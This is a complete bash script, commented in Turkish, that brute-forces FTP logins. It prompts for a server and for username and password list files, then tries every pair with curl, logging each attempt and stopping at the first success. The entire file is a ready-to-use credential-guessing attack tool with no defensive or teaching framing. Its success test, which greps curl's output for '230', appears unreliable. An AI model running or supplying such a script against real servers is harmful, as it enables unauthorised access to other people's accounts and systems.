#!/bin/bash

# Kullanıcıdan input al
read -p "FTP Sunucusu: " SERVER
read -p "Kullanıcı adı listesi dosyası: " USER_LIST
read -p "Parola listesi dosyası: " PASS_LIST

# Log dosyası
LOG_FILE="bruteforce.log"

# Log dosyasını temizle
> "$LOG_FILE"

# Brute force saldırısı
while IFS= read -r USER; do
  while IFS= read -r PASS; do
    echo "Trying $USER:$PASS"
    echo "Trying $USER:$PASS" >> "$LOG_FILE"
    RESPONSE=$(curl -s --user "$USER:$PASS" "ftp://$SERVER" | grep "230")
    if [ -n "$RESPONSE" ]; then
      echo "Login successful: $USER:$PASS"
      echo "Login successful: $USER:$PASS" >> "$LOG_FILE"
      exit 0
    fi
  done < "$PASS_LIST"
done < "$USER_LIST"

echo "Brute force attack finished."
echo "Brute force attack finished." >> "$LOG_FILE"
exit 1